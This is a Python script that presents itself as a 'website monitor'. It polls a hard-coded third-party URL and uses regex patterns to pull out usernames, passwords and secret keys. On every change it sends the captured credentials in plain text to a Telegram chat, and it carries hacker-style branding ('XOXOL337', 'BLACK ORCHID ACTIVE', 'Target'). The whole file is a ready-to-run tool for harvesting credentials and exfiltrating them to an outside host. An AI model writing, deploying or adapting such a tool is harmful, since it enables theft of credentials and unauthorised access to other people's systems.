#!/usr/bin/env python3
"""
Website Monitor Bot - Tracks username, password, secret_key
Sends Telegram notifications on changes
"""

import requests
import re
import json
import time
import os
from datetime import datetime

# ============== CONFIG ==============
URL = "https://stashpatrck.cc/error.php?sys_cmd=run_diagnostics&auth=7f8c9d2e1b3a4f56"
CHECK_INTERVAL = int(os.getenv("CHECK_INTERVAL", "300"))  # 5 minutes default, override with env var

# Telegram settings (from environment variables - for cloud deployment)
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

# File to store last known values
STATE_FILE = "monitor_state.json"

# ============== FUNCTIONS ==============

def send_telegram_message(message):
    """Send message to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] Telegram not configured. Message:")
        print(message)
        return
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            print(f"[+] Telegram notification sent!")
        else:
            print(f"[!] Telegram error: {response.text}")
    except Exception as e:
        print(f"[!] Failed to send Telegram: {e}")

def fetch_data():
    """Fetch and parse the website"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        
        response = requests.get(URL, headers=headers, timeout=30, allow_redirects=True)
        response.raise_for_status()
        
        html = response.text
        
        # Extract credentials using regex patterns
        data = {
            "username": None,
            "password": None,
            "secret_key": None,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Pattern 1: username: value or username=value
        username_patterns = [
            r'username[:\s=]+["\']?([^"\'\s<>]+)',
            r'user[:\s=]+["\']?([^"\'\s<>]+)',
            r'<span[^>]*>\s*username\s*</span>\s*[:\s=]+["\']?([^"\'\s<>]+)',
            r'<td[^>]*>\s*username\s*</td>\s*<td[^>]*>([^<]+)',
        ]
        
        password_patterns = [
            r'password[:\s=]+["\']?([^"\'\s<>]+)',
            r'pass[:\s=]+["\']?([^"\'\s<>]+)',
            r'<span[^>]*>\s*password\s*</span>\s*[:\s=]+["\']?([^"\'\s<>]+)',
            r'<td[^>]*>\s*password\s*</td>\s*<td[^>]*>([^<]+)',
        ]
        
        secret_patterns = [
            r'secret[_\-]?key[:\s=]+["\']?([^"\'\s<>]+)',
            r'secret[:\s=]+["\']?([^"\'\s<>]+)',
            r'key[:\s=]+["\']?([^"\'\s<>]+)',
            r'<span[^>]*>\s*secret[_\-]?key\s*</span>\s*[:\s=]+["\']?([^"\'\s<>]+)',
            r'<td[^>]*>\s*secret[_\-]?key\s*</td>\s*<td[^>]*>([^<]+)',
        ]
        
        # Try to find username
        for pattern in username_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                data["username"] = match.group(1).strip()
                break
        
        # Try to find password
        for pattern in password_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                data["password"] = match.group(1).strip()
                break
        
        # Try to find secret_key
        for pattern in secret_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                data["secret_key"] = match.group(1).strip()
                break
        
        # Also try JSON parsing if page returns JSON
        try:
            json_data = response.json()
            if isinstance(json_data, dict):
                data["username"] = json_data.get("username") or json_data.get("user") or data["username"]
                data["password"] = json_data.get("password") or json_data.get("pass") or data["password"]
                data["secret_key"] = json_data.get("secret_key") or json_data.get("secretkey") or json_data.get("key") or data["secret_key"]
        except:
            pass
        
        return data, html
        
    except Exception as e:
        print(f"[!] Error fetching data: {e}")
        return None, None

def load_last_state():
    """Load last known state from file"""
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, 'r') as f:
                return json.load(f)
        except:
            return None
    return None

def save_state(data):
    """Save current state to file"""
    with open(STATE_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def format_notification(data, is_update=False):
    """Format message for Telegram"""
    status = "🔄 *UPDATE DETECTED!*" if is_update else "✅ *Initial Values*"
    
    msg = f"""{status}

🔗 *URL:* `{URL}`
🕐 *Time:* {data['timestamp']}

👤 *Username:* `{data['username'] or 'Not found'}`
🔐 *Password:* `{data['password'] or 'Not found'}`
🔑 *Secret Key:* `{data['secret_key'] or 'Not found'}`

🤖 XOXOL337 MONITOR"""
    
    return msg

def check_changes(old, new):
    """Check what changed"""
    changes = []
    fields = ["username", "password", "secret_key"]
    
    for field in fields:
        old_val = old.get(field)
        new_val = new.get(field)
        
        if old_val != new_val:
            changes.append(f"{field}: {old_val} → {new_val}")
    
    return changes

def main():
    print("="*60)
    print("🤖 XOXOL337 WEBSITE MONITOR - BLACK ORCHID ACTIVE")
    print("="*60)
    print(f"🎯 Target: {URL}")
    print(f"⏱️  Check interval: {CHECK_INTERVAL} seconds")
    print(f"💾 State file: {STATE_FILE}")
    print(f"📱 Telegram: {'✅ Configured' if TELEGRAM_BOT_TOKEN else '❌ Not configured'}")
    print("="*60)
    
    # Load previous state
    last_state = load_last_state()
    
    # Initial fetch
    print("\n[+] Starting initial fetch...")
    current_data, html = fetch_data()
    
    if not current_data:
        print("[!] Failed to fetch initial data. Exiting.")
        return
    
    print(f"[+] Current values found:")
    print(f"    Username: {current_data['username'] or 'N/A'}")
    print(f"    Password: {current_data['password'] or 'N/A'}")
    print(f"    Secret Key: {current_data['secret_key'] or 'N/A'}")
    
    # Send initial notification
    send_telegram_message(format_notification(current_data, is_update=False))
    
    # Save state
    save_state(current_data)
    last_state = current_data
    
    print(f"\n[+] Monitor running... Press Ctrl+C to stop\n")
    
    # Monitor loop
    while True:
        try:
            time.sleep(CHECK_INTERVAL)
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Checking for updates...")
            
            current_data, html = fetch_data()
            
            if not current_data:
                print("[!] Fetch failed, will retry...")
                continue
            
            # Check for changes
            changes = check_changes(last_state, current_data)
            
            if changes:
                print(f"[+] CHANGES DETECTED!")
                for change in changes:
                    print(f"    • {change}")
                
                # Send notification
                send_telegram_message(format_notification(current_data, is_update=True))
                
                # Save new state
                save_state(current_data)
                last_state = current_data
            else:
                print(f"[+] No changes detected")
                
        except KeyboardInterrupt:
            print("\n[!] Monitor stopped by user")
            break
        except Exception as e:
            print(f"[!] Error in main loop: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
